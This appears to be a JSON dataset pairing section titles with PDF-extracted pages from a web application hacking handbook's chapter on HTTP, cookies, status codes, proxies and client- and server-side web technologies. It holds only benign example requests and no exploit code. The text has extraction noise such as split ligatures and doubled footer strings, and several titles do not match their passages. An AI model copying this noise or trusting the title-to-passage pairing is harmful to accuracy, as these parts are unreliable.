this resource until\nthis time.\nn Location is used in redirection responses (those that have a status code\nstarting with 3) to specify the target of the redirect.\nn Pragma passes caching directives to the browser (for example, no-cache).\nn Server provides information about the web server software being used.\nn Set-Cookie issues cookies to the browser that it will submit back to the\nserver in subsequent requests.\nn WWW-Authenticate is used in responses that have a 401 status code to\nprovide details on the type(s) of authentication that the server supports.\nn X-Frame-Options indicates whether and how the current response may\nbe loaded within a browser frame (see Chapter 13).\ncc0033..iinndddd 4466 88//1199//22001111 1122::0033::4444 PPMM"
  },
  {
    "input": "Cookies",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 47\nChapter 3 n Web Application Technologies 47\nCookies\nCookies are a key part of the HTTP protocol that most web applications rely\non. Frequently they can be used as a vehicle for exploiting vulnerabilities. The\ncookie mechanism enables the server to send items of data to the client, which\nthe client stores and resubmits to the server. Unlike the other types of request\nparameters (those within the URL query string or the message body), cookies\ncontinue to be resubmitted in each subsequent request without any particular\naction required by the application or the user.\nA server issues a cookie using the Set-Cookie response header, as you\nhave seen:\nSet-Cookie: tracking=tI8rk7joMx44S2Uu85nSWc\nThe user’s browser then automatically adds the following header to subsequent\nrequests back to the same server:\nCookie: tracking=tI8rk7joMx44S2Uu85nSWc\nCookies normally consist of a name/value pair, as shown, but they may consist\nof any string that does not contain a space. Multiple cookies can be issued by\nusing multiple Set-Cookie headers in the server’s response. These are submit-\nted back to the server in the same Cookie header, with a semicolon separating\ndifferent individual cookies.\nIn addition to the cookie’s actual value, the Set-Cookie header can include\nany of the following optional attributes, which can be used to control how the\nbrowser handles the cookie:\nn expires sets a date until which the cookie is valid. This causes the browser\nto save the cookie to persistent storage, and it is reused in subsequent\nbrowser sessions until the expiration date is reached. If this attribute is\nnot set, the cookie is used only in the current browser session.\nn domain specifi es the domain for which the cookie is valid. This must be\nthe same or a parent of the domain from which the cookie is received.\nn path specifi es the URL path for which the cookie is valid.\nn secure — If this attribute is set, the cookie will be submitted only in HTTPS\nrequests.\nn HttpOnly — If this attribute is set, the cookie cannot be directly accessed\nvia client-side JavaScript.\nEach of these cookie attributes can impact the application’s security. The\nprimary impact is on the attacker’s ability to directly target other users of the\napplication. See Chapters 12 and 13 for more details.\ncc0033..iinndddd 4477 88//1199//22001111 1122::0033::4444 PPMM"
  },
  {
    "input": "Status Codes",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 48\n48 Chapter 3 n Web Application Technologies\nStatus Codes\nEach HTTP response message must contain a status code in its fi rst line, indi-\ncating the result of the request. The status codes fall into fi ve groups, according\nto the code’s fi rst digit:\nn 1xx — Informational.\nn 2xx — The request was successful.\nn 3xx — The client is redirected to a different resource.\nn 4xx — The request contains an error of some kind.\nn 5xx — The server encountered an error fulfi lling the request.\nThere are numerous specifi c status codes, many of which are used only in\nspecialized circumstances. Here are the status codes you are most likely to\nencounter when attacking a web application, along with the usual reason phrase\nassociated with them:\nn 100 Continue is sent in some circumstances when a client submits a\nrequest containing a body. The response indicates that the request headers\nwere received and that the client should continue sending the body. The\nserver returns a second response when the request has been completed.\nn 200 OK indicates that the request was successful and that the response\nbody contains the result of the request.\nn 201 Created is returned in response to a PUT request to indicate that the\nrequest was successful.\nn 301 Moved Permanently redirects the browser permanently to a different\nURL, which is specifi ed in the Location header. The client should use the\nnew URL in the future rather than the original.\nn 302 Found redirects the browser temporarily to a different URL, which is\nspecifi ed in the Location header. The client should revert to the original\nURL in subsequent requests.\nn 304 Not Modified instructs the browser to use its cached copy of the\nrequested resource. The server uses the If-Modified-Since and If-None-\nMatch request headers to determine whether the client has the latest version\nof the resource.\nn 400 Bad Request indicates that the client submitted an invalid HTTP request.\nYou will probably encounter this when you have modifi ed a request in\ncertain invalid ways, such as by placing a space character into the URL.\nn 401 Unauthorized indicates that the server requires HTTP authentication\nbefore the request will be granted. The WWW-Authenticate header contains\ndetails on the type(s) of authentication supported.\ncc0033..iinndddd 4488 88//1199//22001111 1122::0033::4444 PPMM"
  },
  {
    "input": "HTTP Proxies",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 49\nChapter 3 n Web Application Technologies 49\nn 403 Forbidden indicates that no one is allowed to access the requested\nresource, regardless of authentication.\nn 404 Not Found indicates that the requested resource does not exist.\nn 405 Method Not Allowed indicates that the method used in the request is\nnot supported for the specifi ed URL. For example, you may receive this\nstatus code if you attempt to use the PUT method where it is not supported.\nn 413 Request Entity Too Large — If you are probing for buffer overfl ow\nvulnerabilities in native code, and therefore are submitting long strings\nof data, this indicates that the body of your request is too large for the\nserver to handle.\nn 414 Request URI Too Long is similar to the 413 response. It indicates that\nthe URL used in the request is too large for the server to handle.\nn 500 Internal Server Error indicates that the server encountered an\nerror fulfi lling the request. This normally occurs when you have submit-\nted unexpected input that caused an unhandled error somewhere within\nthe application’s processing. You should closely review the full contents\nof the server’s response for any details indicating the nature of the error.\nn 503 Service Unavailable normally indicates that, although the web\nserver itself is functioning and can respond to requests, the application\naccessed via the server is not responding. You should verify whether this\nis the result of any action you have performed.\nHTTPS\nThe HTTP protocol uses plain TCP as its transport mechanism, which is unen-\ncrypted and therefore can be intercepted by an attacker who is suitably posi-\ntioned on the network. HTTPS is essentially the same application-layer protocol\nas HTTP but is tunneled over the secure transport mechanism, Secure Sockets\nLayer (SSL). This protects the privacy and integrity of data passing over the\nnetwork, reducing the possibilities for noninvasive interception attacks. HTTP\nrequests and responses function in exactly the same way regardless of whether\nSSL is used for transport.\nNOTE SSL has strictly been superseded by transport layer security (TLS), but\nthe latter usually still is referred to using the older name.\nHTTP Proxies\nAn HTTP proxy is a server that mediates access between the client browser and\nthe destination web server. When a browser has been confi gured to use a proxy\ncc0033..iinndddd 4499 88//1199//22001111 1122::0033::4444 PPMM"
  },
  {
    "input": "HTTP Authentication",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 50\n50 Chapter 3 n Web Application Technologies\nserver, it makes all its requests to that server. The proxy relays the requests to\nthe relevant web servers and forwards their responses back to the browser.\nMost proxies also provide additional services, including caching, authentica-\ntion, and access control.\nYou should be aware of two differences in how HTTP works when a proxy\nserver is being used:\nn When a browser issues an unencrypted HTTP request to a proxy server, it\nplaces the full URL into the request, including the protocol prefi x http://,\nthe server’s hostname, and the port number if this is nonstandard. The\nproxy server extracts the hostname and port and uses these to direct the\nrequest to the correct destination web server.\nn When HTTPS is being used, the browser cannot perform the SSL hand-\nshake with the proxy server, because this would break the secure tunnel\nand leave the communications vulnerable to interception attacks. Hence,\nthe browser must use the proxy as a pure TCP-level relay, which passes\nall network data in both directions between the browser and the destina-\ntion web server, with which the browser performs an SSL handshake as\nnormal. To establish this relay, the browser makes an HTTP request to the\nproxy server using the CONNECT method and specifying the destination\nhostname and port number as the URL. If the proxy allows the request,\nit returns an HTTP response with a 200 status, keeps the TCP connection\nopen, and from that point onward acts as a pure TCP-level relay to the\ndestination web server.\nBy some measure, the most useful item in your toolkit when attacking web\napplications is a specialized kind of proxy server that sits between your browser\nand the target website and allows you to intercept and modify all requests and\nresponses, even those using HTTPS. We will begin examining how you can use\nthis kind of tool in the next chapter.\nHTTP Authentication\nThe HTTP protocol includes its own mechanisms for authenticating users using\nvarious authentication schemes, including the following:\nn Basic is a simple authentication mechanism that sends user credentials as\na Base64-encoded string in a request header with each message.\nn NTLM is a challenge-response mechanism and uses a version of the\nWindows NTLM protocol.\nn Digest is a challenge-response mechanism and uses MD5 checksums of\na nonce with the user’s credentials.\ncc0033..iinndddd 5500 88//1199//22001111 1122::0033::4444 PPMM"
  },
  {
    "input": "Server-Side Functionality",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 51\nChapter 3 n Web Application Technologies 51\nIt is relatively rare to encounter these authentication protocols being used\nby web applications deployed on the Internet. They are more commonly used\nwithin organizations to access intranet-based services.\nCOMMON MYTH\n“Basic authentication is insecure.”\nBecause basic authentication places credentials in unencrypted form within\nthe HTTP request, it is frequently stated that the protocol is insecure and\nshould not be used. But forms-based authentication, as used by numerous\nbanks, also places credentials in unencrypted form within the HTTP request.\nAny HTTP message can be protected from eavesdropping attacks by using HTTPS\nas a transport mechanism, which should be done by every security-conscious\napplication. In relation to eavesdropping, at least, basic authentication in itself\nis no worse than the methods used by the majority of today’s web applications.\nWeb Functionality\nIn addition to the core communications protocol used to send messages between\nclient and server, web applications employ numerous technologies to deliver\ntheir functionality. Any reasonably functional application may employ dozens\nof distinct technologies within its server and client components. Before you can\nmount a serious attack against a web application, you need a basic understand-\ning of how its functionality is implemented, how the technologies used are\ndesigned to behave, and where their weak points are likely to lie.\nServer-Side Functionality\nThe early World Wide Web contained entirely static content. Websites con-\nsisted of various resources such as HTML pages and images, which were\nsimply loaded onto a web server and delivered to any user who requested\nthem. Each time a particular resource was requested, the server responded\nwith the same content.\nToday’s web applications still typically employ a fair number of static resources.\nHowever, a large amount of the content that they present to users is generated\ndynamically. When a user requests a dynamic resource, the server’s response\nis created on the fl y, and each user may receive content that is uniquely custom-\nized for him or her.\nDynamic content is generated by scripts or other code executing on the server.\nThese scripts are akin to computer programs in their own right. They have vari-\nous inputs, perform processing on these, and return their outputs to the user.\ncc0033..iinndddd 5511 88//1199//22001111 1122::0033::4444 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 52\n52 Chapter 3 n Web Application Technologies\nWhen a user’s browser requests a dynamic resource, normally it does not\nsimply ask for a copy of that resource. In general, it also submits various\nparameters along with its request. It is these parameters that enable the server-\nside application to generate content that is tailored to the individual user.\nHTTP requests can be used to send parameters to the application in three\nmain ways:\nn In the URL query string\nn In the fi le path of REST-style URLs\nn In HTTP cookies\nn In the body of requests using the POST method\nIn addition to these primary sources of input, the server-side application may\nin principle use any part of the HTTP request as an input to its processing. For\nexample, an application may process the User-Agent header to generate content\nthat is optimized for the type of browser being used.\nLike computer software in general, web applications employ a wide range of\ntechnologies on the server side to deliver their functionality:\nn Scripting languages such as PHP, VBScript, and Perl\nn Web application platforms such as ASP.NET and Java\nn Web servers such as Apache, IIS, and Netscape Enterprise\nn Databases such as MS-SQL, Oracle, and MySQL\nn Other back-end components such as fi lesystems, SOAP-based web services,\nand directory services\nAll these technologies and the types of vulnerabilities that can arise in rela-\ntion to them are examined in detail throughout this book. Some of the most\ncommon web application platforms and technologies you are likely to encounter\nare described in the following sections.\nCOMMON MYTH\n“Our applications need only cursory security review, because they employ a\nwell-used framework.”\nUse of a well-used framework is often a cause for complacency in web\napplication development, on the assumption that common vulnerabilities\nsuch as SQL injection are automatically avoided. This assumption is mistaken\nfor two reasons.\nFirst, a large number of web application vulnerabilities arise in an applica-\ntion’s design, not its implementation, and are independent of the development\nframework or language chosen.\ncc0033..iinndddd 5522 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 53\nChapter 3 n Web Application Technologies 53\nSecond, because a framework typically employs plug-ins and packages\nfrom the cutting edge of the latest repositories, it is likely that these packages\nhave not undergone security review. Interestingly, if a vulnerability is later\nfound in the application, the same proponents of the myth will readily swap\nsides and blame their framework or third-party package!\nThe Java Platform\nFor many years, the Java Platform, Enterprise Edition (formerly known as J2EE)\nwas a de facto standard for large-scale enterprise applications. Originally devel-\noped by Sun Microsystems and now owned by Oracle, it lends itself to multitiered\nand load-balanced architectures and is well suited to modular development and\ncode reuse. Because of its long history and widespread adoption, many high-\nquality development tools, application servers, and frameworks are available to\nassist developers. The Java Platform can be run on several underlying operating\nsystems, including Windows, Linux, and Solaris.\nDescriptions of Java-based web applications often employ a number of poten-\ntially confusing terms that you may need to be aware of:\nn AnEnterprise Java Bean (EJB) is a relatively heavyweight software com-\nponent that encapsulates the logic of a specifi c business function within the\napplication. EJBs are intended to take care of various technical challenges\nthat application developers must address, such as transactional integrity.\nn A Plain Old Java Object (POJO) is an ordinary Java object, as distinct\nfrom a special object such as an EJB. A POJO normally is used to denote\nobjects that are user-defi ned and are much simpler and more lightweight\nthan EJBs and those used in other frameworks.\nn AJava Servlet is an object that resides on an application server and receives\nHTTP requests from clients and returns HTTP responses. Servlet imple-\nmentations can use numerous interfaces to facilitate the development of\nuseful applications.\nn A Java web container is a platform or engine that provides a runtime\nenvironment for Java-based web applications. Examples of Java web con-\ntainers are Apache Tomcat, BEA WebLogic, and JBoss.\nMany Java web applications employ third-party and open source components\nalongside custom-built code. This is an attractive option because it reduces\ndevelopment effort, and Java is well suited to this modular approach. Here are\nsome examples of components commonly used for key application functions:\nn Authentication — JAAS, ACEGI\nn Presentation layer — SiteMesh, Tapestry\ncc0033..iinndddd 5533 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 54\n54 Chapter 3 n Web Application Technologies\nn Database object relational mapping — Hibernate\nn Logging — Log4J\nIf you can determine which open source packages are used in the application\nyou are attacking, you can download these and perform a code review or install\nthem to experiment on. A vulnerability in any of these may be exploitable to\ncompromise the wider application.\nASP.NET\nASP.NET is Microsoft’s web application framework and is a direct competitor\nto the Java Platform. ASP.NET is several years younger than its counterpart but\nhas made signifi cant inroads into Java’s territory.\nASP.NET uses Microsoft’s .NET Framework, which provides a virtual machine\n(the Common Language Runtime) and a set of powerful APIs. Hence, ASP.NET\napplications can be written in any .NET language, such as C# or VB.NET.\nASP.NET lends itself to the event-driven programming paradigm that is\nnormally used in conventional desktop software, rather than the script-based\napproach used in most earlier web application frameworks. This, together with\nthe powerful development tools provided with Visual Studio, makes devel-\noping a functional web application extremely easy for anyone with minimal\nprogramming skills.\nThe ASP.NET framework helps protect against some common web application\nvulnerabilities such as cross-site scripting, without requiring any effort from\nthe developer. However, one practical downside of its apparent simplicity is that\nmany small-scale ASP.NET applications are actually created by beginners who\nlack any awareness of the core security problems faced by web applications.\nPHP\nThe PHP language emerged from a hobby project (the acronym originally stood\nfor “personal home page”). It has since evolved almost unrecognizably into\na highly powerful and rich framework for developing web applications. It is\noften used in conjunction with other free technologies in what is known as the\nLAMP stack (composed of Linux as the operating system, Apache as the web\nserver, MySQL as the database server, and PHP as the programming language\nfor the web application).\nNumerous open source applications and components have been developed\nusing PHP. Many of these provide off-the-shelf solutions for common application\nfunctions, which are often incorporated into wider custom-built applications:\nn Bulletin boards — PHPBB, PHP-Nuke\nn Administrative front ends — PHPMyAdmin\ncc0033..iinndddd 5544 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 55\nChapter 3 n Web Application Technologies 55\nn Web mail — SquirrelMail, IlohaMail\nn Photo galleries — Gallery\nn Shopping carts — osCommerce, ECW-Shop\nn Wikis — MediaWiki, WakkaWikki\nBecause PHP is free and easy to use, it has often been the language of choice\nfor many beginners writing web applications. Furthermore, the design and\ndefault confi guration of the PHP framework has historically made it easy for\nprogrammers to unwittingly introduce security bugs into their code. These\nfactors have meant that applications written in PHP have suffered from a dis-\nproportionate number of security vulnerabilities. In addition, several defects\nhave existed within the PHP platform itself that often could be exploited via\napplications running on it. See Chapter 19 for details on common defects aris-\ning in PHP applications.\nRuby on Rails\nRails 1.0 was released in 2005, with strong emphasis on Model-View-Controller\narchitecture. A key strength of Rails is the breakneck speed with which\nfully fl edged data-driven applications can be created. If a developer follows the\nRails coding style and naming conventions, Rails can autogenerate a model\nfor database content, controller actions for modifying it, and default views for\nthe application user. As with any highly functional new technology, several\nvulnerabilities have been found in Ruby on Rails, including the ability to bypass\na “safe mode,” analogous to that found in PHP.\nMore details on recent vulnerabilities can be found here:\nwww.ruby-lang.org/en/security/\nSQL\nStructured Query Language (SQL) is used to access data in relational databases,\nsuch as Oracle, MS-SQL server and MySQL. The vast majority of today’s web\napplications employ SQL-based databases as their back-end data store, and nearly\nall application functions involve interaction with these data stores in some way.\nRelational databases store data in tables, each of which contains a number\nof rows and columns. Each column represents a data fi eld, such as “name” or\n“e-mail address,” and each row represents an item with values assigned to some\nor all of these fi elds.\nSQL uses queries to perform common tasks such as reading, adding, updat-\ning, and deleting data. For example, to retrieve a user’s e-mail address with a\nspecifi ed name, an application might perform the following query:\nselect email from users where name = ‘daf’\ncc0033..iinndddd 5555 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 56\n56 Chapter 3 n Web Application Technologies\nTo implement the functionality they need, web applications may incorporate\nuser-supplied input into SQL queries that are executed by the back-end data-\nbase. If this process is not carried out safely, attackers may be able to submit\nmalicious input to interfere with the database and potentially read and write\nsensitive data. These attacks are described in Chapter 9, along with detailed\nexplanations of the SQL language and how it can be used.\nXML\nExtensible Markup Language (XML) is a specifi cation for encoding data in a\nmachine-readable form. Like any markup language, the XML format sepa-\nrates a document into content (which is data) and markup (which annotates\nthe data).\nMarkup is primarily represented using tags, which may be start tags, end\ntags, or empty-element tags:\n<tagname>\n</tagname>\n<tagname />\nStart and end tags are paired into elements and may encapsulate document\ncontent or child elements:\n<pet>ginger</pet>\n<pets><dog>spot</dog><cat>paws</cat></pets>\nTags may include attributes, which are name/value pairs:\n<data version=”2.1”><pets>...</pets></data>\nXML is extensible in that it allows arbitrary tag and attribute names. XML\ndocuments often include a Document Type Defi nition (DTD), which defi nes\nthe tags and attributes used in the documents and the ways in which they can\nbe combined.\nXML and technologies derived from it are used extensively in web applica-\ntions, on both the server and client side, as described in later sections of this\nchapter.\nWeb Services\nAlthough this book covers web application hacking, many of the vulnerabilities\ndescribed are equally applicable to web services. In fact, many applications are\nessentially a GUI front-end to a set of back-end web services.\ncc0033..iinndddd 5566 88//1199//22001111 1122::0033::4455 PPMM"
  },
  {
    "input": "Client-Side Functionality",
    "output": "Stuttard c03.indd V3 - 07/22/2011 Page 57\nChapter 3 n Web Application Technologies 57\nWeb services use Simple Object Access Protocol (SOAP) to exchange data.\nSOAP typically uses the HTTP protocol to transmit messages and represents\ndata using the XML format.\nA typical SOAP request is as follows:\nPOST /doTransfer.asp HTTP/1.0\nHost: mdsec-mgr.int.mdsec.net\nContent-Type: application/soap+xml; charset=utf-8\nContent-Length: 891\n<?xml version=”1.0”?>\n<soap:Envelope xmlns:soap=”http://www.w3.org/2001/12/soap-envelope”>\n<soap:Body>\n<pre:Add xmlns:pre=http://target/lists soap:encodingStyle=\n“http://www.w3.org/2001/12/soap-encoding”>\n<Account>\n<FromAccount>18281008</FromAccount>\n<Amount>1430</Amount>\n<ClearedFunds>False</ClearedFunds>\n<ToAccount>08447656</ToAccount>\n</Account>\n</pre:Add>\n</soap:Body>\n</soap:Envelope>\nIn the context of web applications accessed using a browser, you are most\nlikely to encounter SOAP being used by the server-side application to com-\nmunicate with various back-end systems. If user-supplied data is incorporated\ndirectly into back-end SOAP messages, similar vulnerabilities can arise as for\nSQL. These issues are described in detail in Chapter 10.\nIf a web application also exposes web services directly, these are also worthy\nof examination. Even if the front-end application is simply written on top of the\nweb service, differences may exist in input handling and in the functionality\nexposed by the services themselves. The server normally publishes the available\nservices and parameters using the Web Services Description Language (WSDL)\nformat. Tools such as soapUI can be used to create sample requests based on a\npublished WSDL fi le to call the authentication web service, gain an authentica-\ntion token, and make any subsequent web service requests.\nClient-Side Functionality\nFor the server-side application to receive user input and actions and present\nthe results to the user, it needs to provide a client-side user interface. Because\nall web applications are accessed via a web browser, these interfaces all share a\ncc0033..iinndddd 5577 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 58\n58 Chapter 3 n Web Application Technologies\ncommon core of technologies. However, these have been built upon in various,\ndiverse ways, and the ways in which applications leverage client-side technol-\nogy has continued to evolve rapidly in recent years.\nHTML\nThe core technology used to build web interfaces is hypertext markup language\n(HTML). Like XML, HTML is a tag-based language that is used to describe the\nstructure of documents that are rendered within the browser. From its simple\nbeginnings as a means of providing basic formatting for text documents, HTML\nhas developed into a rich and powerful language that can be used to create\nhighly complex and functional user interfaces.\nXHTML is a development of HTML that is based on XML and that has a stricter\nspecifi cation than older versions of HTML. Part of the motivation for XHTML\nwas the need to move toward a more rigid standard for HTML markup to avoid\nthe various compromises and security issues that can arise when browsers are\nobligated to tolerate less-strict forms of HTML.\nMore details about HTML and related technologies appear in the following\nsections.\nHyperlinks\nA large amount of communication from client to server is driven by the user’s\nclicking on hyperlinks. In web applications, hyperlinks frequently contain preset\nrequest parameters. These are items of data that the user never enters; they are\nsubmitted because the server places them into the target URL of the hyperlink\nthat the user clicks. For example, a web application might present a series of\nlinks to news stories, each having the following form:\n<a href=”?redir=/updates/update29.html”>What’s happening?</a>\nWhen a user clicks this link, the browser makes the following request:\nGET /news/8/?redir=/updates/update29.html HTTP/1.1\nHost: mdsec.net\n...\nThe server receives the redir parameter in the query string and uses its value\nto determine what content should be presented to the user.\nForms\nAlthough hyperlink-based navigation is responsible for a large amount of client-\nto-server communications, most web applications need more fl exible ways\nto gather input and receive actions from users. HTML forms are the usual\ncc0033..iinndddd 5588 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 59\nChapter 3 n Web Application Technologies 59\nmechanism for allowing users to enter arbitrary input via their browser. A\ntypical form is as follows:\n<form action=”/secure/login.php?app=quotations” method=”post”>\nusername: <input type=”text” name=”username”><br>\npassword: <input type=”password” name=”password”>\n<input type=”hidden” name=”redir” value=”/secure/home.php”>\n<input type=”submit” name=”submit” value=”log in”>\n</form>\nWhen the user enters values into the form and clicks the Submit button, the\nbrowser makes a request like the following:\nPOST /secure/login.php?app=quotations HTTP/1.1\nHost: wahh-app.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 39\nCookie: SESS=GTnrpx2ss2tSWSnhXJGyG0LJ47MXRsjcFM6Bd\nusername=daf&password=foo&redir=/secure/home.php&submit=log+in\nIn this request, several points of interest refl ect how different aspects of the\nrequest are used to control server-side processing:\nn Because the HTML form tag contains an attribute specifying the POST\nmethod, the browser uses this method to submit the form and places the\ndata from the form into the body of the request message.\nn In addition to the two items of data that the user enters, the form contains\na hidden parameter (redir) and a submit parameter (submit). Both of\nthese are submitted in the request and may be used by the server-side\napplication to control its logic.\nn The target URL for the form submission contains a preset parameter (app),\nas in the hyperlink example shown previously. This parameter may be\nused to control the server-side processing.\nn The request contains a cookie parameter (SESS), which was issued to the\nbrowser in an earlier response from the server. This parameter may be\nused to control the server-side processing.\nThe preceding request contains a header specifying that the type of content in\nthe message body is x-www-form-urlencoded. This means that parameters are\nrepresented in the message body as name/value pairs in the same way as they\nare in the URL query string. The other content type you are likely to encoun-\nter when form data is submitted is multipart/form-data. An application can\nrequest that browsers use multipart encoding by specifying this in an enctype\nattribute in the form tag. With this form of encoding, the Content-Type header\nin the request also specifi es a random string that is used as a separator for the\ncc0033..iinndddd 5599 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 60\n60 Chapter 3 n Web Application Technologies\nparameters contained in the request body. For example, if the form specifi ed\nmultipart encoding, the resulting request would look like the following:\nPOST /secure/login.php?app=quotations HTTP/1.1\nHost: wahh-app.com\nContent-Type: multipart/form-data; boundary=------------7d71385d0a1a\nContent-Length: 369\nCookie: SESS=GTnrpx2ss2tSWSnhXJGyG0LJ47MXRsjcFM6Bd\n------------7d71385d0a1a\nContent-Disposition: form-data; name=”username”\ndaf\n------------7d71385d0a1a\nContent-Disposition: form-data; name=”password”\nfoo\n------------7d71385d0a1a\nContent-Disposition: form-data; name=”redir”\n/secure/home.php\n------------7d71385d0a1a\nContent-Disposition: form-data; name=”submit”\nlog in\n------------7d71385d0a1a--\nCSS\nCascading Style Sheets (CSS) is a language used to describe the presentation of a\ndocument written in a markup language. Within web applications, it is used to\nspecify how HTML content should be rendered on-screen (and in other media,\nsuch as the printed page).\nModern web standards aim to separate as much as possible the content of a\ndocument from its presentation. This separation has numerous benefi ts, includ-\ning simpler and smaller HTML pages, easier updating of formatting across a\nwebsite, and improved accessibility.\nCSS is based on formatting rules that can be defi ned with different levels\nof specifi city. Where multiple rules match an individual document element,\ndifferent attributes defi ned in those rules can “cascade” through these rules so\nthat the appropriate combination of style attributes is applied to the element.\nCSS syntax uses selectors to defi ne a class of markup elements to which\na given set of attributes should be applied. For example, the following\nCSS rule defi nes the foreground color for headings that are marked up using\n<h2> tags:\nh2 { color: red; }\ncc0033..iinndddd 6600 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 61\nChapter 3 n Web Application Technologies 61\nIn the earliest days of web application security, CSS was largely overlooked\nand was considered to have no security implications. Today, CSS is increasingly\nrelevant both as a source of security vulnerabilities in its own right and as a\nmeans of delivering effective exploits for other categories of vulnerabilities (see\nChapters 12 and 13 for more information).\nJavaScript\nHyperlinks and forms can be used to create a rich user interface that can easily\ngather most kinds of input that web applications require. However, most appli-\ncations employ a more distributed model, in which the client side is used not\nsimply to submit user data and actions but also to perform actual processing\nof data. This is done for two primary reasons:\nn It can improve the application’s performance, because certain tasks can\nbe carried out entirely on the client component, without needing to make\na round trip of request and response to the server.\nn It can enhance usability, because parts of the user interface can be dynami-\ncally updated in response to user actions, without needing to load an\nentirely new HTML page delivered by the server.\nJavaScript is a relatively simple but powerful programming language that\ncan be easily used to extend web interfaces in ways that are not possible using\nHTML alone. It is commonly used to perform the following tasks:\nn Validating user-entered data before it is submitted to the server to avoid\nunnecessary requests if the data contains errors\nn Dynamically modifying the user interface in response to user actions — for\nexample, to implement drop-down menus and other controls familiar\nfrom non-web interfaces\nn Querying and updating the document object model (DOM) within the\nbrowser to control the browser’s behavior (the browser DOM is described\nin a moment)\nVBScript\nVBScript is an alternative to JavaScript that is supported only in the Internet\nExplorer browser. It is modeled on Visual Basic and allows interaction with\nthe browser DOM. But in general it is somewhat less powerful and developed\nthan JavaScript.\nDue to its browser-specifi c nature, VBScript is scarcely used in today’s web\napplications. Its main interest from a security perspective is as a means of\ndelivering exploits for vulnerabilities such as cross-site scripting in occasional\nsituations where an exploit using JavaScript is not feasible (see Chapter 12).\ncc0033..iinndddd 6611 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 62\n62 Chapter 3 n Web Application Technologies\nDocument Object Model\nThe Document Object Model (DOM) is an abstract representation of an HTML\ndocument that can be queried and manipulated through its API.\nThe DOM allows client-side scripts to access individual HTML elements by\ntheir id and to traverse the structure of elements programmatically. Data such\nas the current URL and cookies can also be read and updated. The DOM also\nincludes an event model, allowing code to hook events such as form submission,\nnavigation via links, and keystrokes.\nManipulation of the browser DOM is a key technique used in Ajax-based\napplications, as described in the following section.\nAjax\nAjax is a collection of programming techniques used on the client side to create\nuser interfaces that aim to mimic the smooth interaction and dynamic behavior\nof traditional desktop applications.\nThe name originally was an acronym for “Asynchronous JavaScript and\nXML,” although in today’s web Ajax requests need not be asynchronous and\nneed not employ XML.\nThe earliest web applications were based on complete pages. Each user action,\nsuch as clicking a link or submitting a form, initiated a window-level navigation\nevent, causing a new page to be loaded from the server. This approach resulted\nin a disjointed user experience, with noticeable delays while large responses\nwere received from the server and the whole page was rerendered.\nWith Ajax, some user actions are handled within client-side script code and\ndo not cause a full reload of the page. Instead, the script performs a request “in\nthe background” and typically receives a much smaller response that is used to\ndynamically update only part of the user interface. For example, in an Ajax-based\nshopping application, clicking an Add to Cart button may cause a background\nrequest that updates the server-side record of the user’s shopping cart and a\nlightweight response that updates the number of cart items showing on the\nuser’s screen. Virtually the entire existing page remains unmodifi ed within the\nbrowser, providing a much faster and more satisfying experience for the user.\nThe core technology used in Ajax is XMLHttpRequest. After a certain consolida-\ntion of standards, this is now a native JavaScript object that client-side scripts can\nuse to make “background” requests without requiring a window-level naviga-\ntion event. Despite its name, XMLHttpRequest allows arbitrary content to be sent\nin requests and received in responses. Although many Ajax applications do use\nXML to format message data, an increasing number have opted to exchange data\nusing other methods of representation. (See the next section for one example.)\nNote that although most Ajax applications do use asynchronous communica-\ntions with the server, this is not essential. In some situations, it may actually make\ncc0033..iinndddd 6622 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 63\nChapter 3 n Web Application Technologies 63\nmore sense to prevent user interaction with the application while a particular\naction is carried out. In these situations, Ajax is still benefi cial in providing a\nmore seamless experience by avoiding the need to reload an entire page.\nHistorically, the use of Ajax has introduced some new types of vulnerabili-\nties into web applications. More broadly, it also increases the attack surface of\na typical application by introducing more potential targets for attack on both\nthe server and client side. Ajax techniques are also available for use by attack-\ners when they are devising more effective exploits for other vulnerabilities. See\nChapters 12 and 13 for more details.\nJSON\nJavaScript Object Notation (JSON) is a simple data transfer format that can\nbe used to serialize arbitrary data. It can be processed directly by JavaScript\ninterpreters. It is commonly employed in Ajax applications as an alternative to\nthe XML format originally used for data transmission. In a typical situation,\nwhen a user performs an action, client-side JavaScript uses XMLHttpRequest to\ncommunicate the action to the server. The server returns a lightweight response\ncontaining data in JSON format. The client-side script then processes this data\nand updates the user interface accordingly.\nFor example, an Ajax-based web mail application may contain a feature to\nshow the details of a selected contact. When a user clicks a contact, the browser\nuses XMLHttpRequest to retrieve the details of the selected contact, which are\nreturned using JSON:\n{\n“name”: “Mike Kemp”,\n“id”: “8041148671”,\n“email”: “fkwitt@layerone.com”\n}\nThe client-side script uses the JavaScript interpreter to consume the JSON\nresponse and updates the relevant part of the user interface based on its contents.\nA further location where you may encounter JSON data in today’s applications\nis as a means of encapsulating data within conventional request parameters. For\nexample, when the user updates the details of a contact, the new information\nmight be communicated to the server using the following request:\nPOST /contacts HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 89\nContact={“name”:”Mike Kemp”,”id”:”8041148671”,”email”:”pikey@\nclappymonkey.com”}\n&submit=update\ncc0033..iinndddd 6633 88//1199//22001111 1122::0033::4455 PPMM\nStuttard c03.indd V3 - 07/22/2011 Page 64\n64 Chapter 3 n Web Application Technologies\nSame-Origin Policy\nThe same-origin policy is a key mechanism implemented within browsers that\nis designed to keep content that came from different origins from 